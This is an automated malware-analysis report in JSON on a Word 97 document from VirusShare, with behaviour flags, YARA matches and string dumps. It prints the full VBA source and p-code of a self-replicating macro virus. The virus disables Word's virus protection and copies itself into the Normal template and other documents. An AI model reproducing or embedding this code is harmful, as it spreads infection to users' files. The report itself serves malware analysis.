{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AddFromString": "May attempt to modify the VBA code",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "Private Sub Document_Open(): IT\nEnd Sub\nPrivate Function IT()\nOptions.ConfirmConversions = 0\nOptions.SaveNormalPrompt = 0\nOptions.VirusProtection = 0\nIf ThisDocument = NormalTemplate Then Set Target = ActiveDocument Else Set Target = NormalTemplate\nSet TargetModule = Target.VBProject.VBComponents.Item(1).CodeModule\nIf TargetModule.CountOfLines = 0 Then TargetModule.AddFromString \"Private Sub Document_Open()\" & vbCrLf & \"End Sub\"\nFor X = 1 To TargetModule.CountOfLines\nIf TargetModule.Lines(X, 1) = \"Private Function IT()\" Then GoTo Quit\nNext\nSet Host = ThisDocument.VBProject.VBComponents.Item(1).CodeModule\nFor X = 1 To Host.CountOfLines\nIf Host.Lines(X, 1) = \"Private Function IT()\" Then GoTo Continue\nNext\nContinue:\nTD = Host.Lines(X, 24)\nFor X = 1 To TargetModule.CountOfLines\nIf Left(TargetModule.Lines(X, 1), 4) = \"Sub \" Then TargetModule.ReplaceLine X, TargetModule.Lines(X, 1) & \": IT\"\nIf Left(TargetModule.Lines(X, 1), 12) = \"Private Sub \" Then TargetModule.ReplaceLine X, TargetModule.Lines(X, 1) & \": IT\"\nNext\nTargetModule.AddFromString TD\nIf Target = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName\nQuit:\nEnd Function\n\n' Processing file: VirusShare_2c830433e21ffa4fa760a4caf7c2387f\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 3227 bytes\n' Line #0:\n' \tFuncDefn (Private Sub Document_Open())\n' \tBoS 0x0000 \n' \tArgsCall IT 0x0000 \n' Line #1:\n' \tEndSub \n' Line #2:\n' \tFuncDefn (Private Function IT(id_FFFE As Variant))\n' Line #3:\n' \tLitDI2 0x0000 \n' \tLd Options \n' \tMemSt ConfirmConversions \n' Line #4:\n' \tLitDI2 0x0000 \n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' Line #5:\n' \tLitDI2 0x0000 \n' \tLd Options \n' \tMemSt VirusProtection \n' Line #6:\n' \tLd ThisDocument \n' \tLd NormalTemplate \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tSetStmt \n' \tLd ActiveDocument \n' \tSet Target \n' \tElse \n' \tBoSImplicit \n' \tSetStmt \n' \tLd NormalTemplate \n' \tSet Target \n' \tEndIf \n' Line #7:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd Target \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tSet TargetModule \n' Line #8:\n' \tLd TargetModule \n' \tMemLd CountOfLines \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x001B \"Private Sub Document_Open()\"\n' \tLd vbCrLf \n' \tConcat \n' \tLitStr 0x0007 \"End Sub\"\n' \tConcat \n' \tLd TargetModule \n' \tArgsMemCall AddFromString 0x0001 \n' \tEndIf \n' Line #9:\n' \tStartForVariable \n' \tLd X \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd TargetModule \n' \tMemLd CountOfLines \n' \tFor \n' Line #10:\n' \tLd X \n' \tLitDI2 0x0001 \n' \tLd TargetModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x0015 \"Private Function IT()\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo Quit \n' \tEndIf \n' Line #11:\n' \tStartForVariable \n' \tNext \n' Line #12:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ThisDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tSet Host \n' Line #13:\n' \tStartForVariable \n' \tLd X \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd Host \n' \tMemLd CountOfLines \n' \tFor \n' Line #14:\n' \tLd X \n' \tLitDI2 0x0001 \n' \tLd Host \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x0015 \"Private Function IT()\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo Continue \n' \tEndIf \n' Line #15:\n' \tStartForVariable \n' \tNext \n' Line #16:\n' \tLabel Continue \n' Line #17:\n' \tLd X \n' \tLitDI2 0x0018 \n' \tLd Host \n' \tArgsMemLd Lines 0x0002 \n' \tSt TD \n' Line #18:\n' \tStartForVariable \n' \tLd X \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd TargetModule \n' \tMemLd CountOfLines \n' \tFor \n' Line #19:\n' \tLd X \n' \tLitDI2 0x0001 \n' \tLd TargetModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitDI2 0x0004 \n' \tArgsLd LBound 0x0002 \n' \tLitStr 0x0004 \"Sub \"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd X \n' \tLd X \n' \tLitDI2 0x0001 \n' \tLd TargetModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x0004 \": IT\"\n' \tConcat \n' \tLd TargetModule \n' \tArgsMemCall ReplaceLine 0x0002 \n' \tEndIf \n' Line #20:\n' \tLd X \n' \tLitDI2 0x0001 \n' \tLd TargetModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitDI2 0x000C \n' \tArgsLd LBound 0x0002 \n' \tLitStr 0x000C \"Private Sub \"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd X \n' \tLd X \n' \tLitDI2 0x0001 \n' \tLd TargetModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x0004 \": IT\"\n' \tConcat \n' \tLd TargetModule \n' \tArgsMemCall ReplaceLine 0x0002 \n' \tEndIf \n' Line #21:\n' \tStartForVariable \n' \tNext \n' Line #22:\n' \tLd TD \n' \tLd TargetModule \n' \tArgsMemCall AddFromString 0x0001 \n' Line #23:\n' \tLd Target \n' \tLd ActiveDocument \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' \tEndIf \n' Line #24:\n' \tLabel Quit \n' Line #25:\n' \tEndFunc \n"
    },
    "filename": "VirusShare_2c830433e21ffa4fa760a4caf7c2387f",
    "filesize": 28160,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1252, Author: Lys Kovick, Template: Normal.dot, Last Saved By: Lys Kovick, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Total Editing Time: 04:00, Create Time/Date: Fri Feb 18 21:25:00 2000, Last Saved Time/Date: Fri Feb 18 21:30:00 2000, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "2c830433e21ffa4fa760a4caf7c2387f",
        "sha1": "7e779314f6125e2240e49dabf053a291a34bfe10",
        "sha256": "f771101d88ef65dc61cf27f09dec570445ad964d980fc5bb8d4b68ec1a243b84"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjt+t+",
            "`<UWz",
            "/ =!",
            "\u0653B\u0793B",
            "Lys Kovick",
            "Normal.dot",
            "Lys Kovick",
            "Microsoft Word 8.0",
            "?OWz",
            "Title",
            "_PID_GUID",
            "(3VWz",
            "NDOWS\\Desktop",
            "onstruction (Blade",
            "ack)",
            "`<UWz",
            "sUWz",
            "WS\\All Users\\Des",
            "= Noi",
            " = A",
            "Private Sub Document_Open()",
            "End Sub",
            "Target",
            "Private Function IT()",
            "Private Function IT()",
            "Sub ",
            ": IT",
            "Private Sub ",
            ": IT",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "8 Sub ",
            "t_Open()",
            ": IT",
            "Fun ction",
            "s.C@onfirm",
            "vers",
            "SavePro",
            "Virus",
            "te-= ",
            "If \t",
            "en Set Targ",
            "Modu",
            ".VB#j#@",
            "C@,on",
            "s.I@tem(1);de",
            "untOfLin",
            "ng \"",
            "a\" & vbChrLf",
            "or XD1 T",
            "'B%(X, 1)@",
            "u\"C,",
            "Quit",
            "Nex@",
            "AKHos",
            "oIfJ-",
            "JK+B",
            "tin\u0343*",
            "24hPLeft(",
            ", 4B)ah$'J",
            "Resce!",
            ";an`;",
            ",127_",
            "kUTDhJ",
            "+YLnTh`rk",
            "A@s File!:B=",
            "Full",
            "M 6\\",
            "1138adb995",
            "Wordk",
            "Win16~",
            "Win32",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Document_Open",
            "Documentj",
            "Options",
            "ConfirmConversions",
            "SaveNormalPrompt\u02bc",
            "VirusProtectionoD",
            "NormalTemplateq",
            "TargetF",
            "ActiveDocument\\",
            "TargetModule",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "CodeModule",
            "CountOfLines!\\",
            "AddFromString",
            "vbCrLf",
            "Lines",
            "Quit9",
            "Host",
            "ContinueT",
            "TD=_",
            "ReplaceLine",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "_B_var_TargetU",
            "_B_var_TargetModulex",
            "_B_var_X",
            "_B_var_Host",
            "_B_var_TD",
            "_B_var_LeftQ",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation",
            "mMSFo@rms>",
            "F1346D2",
            "E2-9E2A-",
            "11D3-97D",
            "F5CDD50",
            "3.TWD#",
            "Microsof",
            "` Ob",
            " Library",
            "P08975C2-C6E9",
            "PJP\\VBE",
            "\\(EX(.E",
            "CxN@UalCxNTax",
            " +\t,C",
            "OfficDO@`f",
            "G{2DF8D04C-5BF",
            "f01B-BDE=TAA@f4",
            "ROGRAM F",
            "ILES\\MIC",
            "ROSOFT O@FFICE\\",
            "SO97.DLLCHk# 8.0k",
            "BThisDoc@ument",
            "h@6sD",
            "ThisDocument",
            "ID=\"{B5510B3A-E617-11D3-97D5-0050046DD505}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"E3E176955D995D995D995D99\"",
            "DPB=\"CCCE598AAB72AC72AC72\"",
            "GC=\"B5B720A5E08FE18FE170\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=44, 44, 460, 382, Z",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8",
            "*VWz",
            "*VWz"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.289167",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
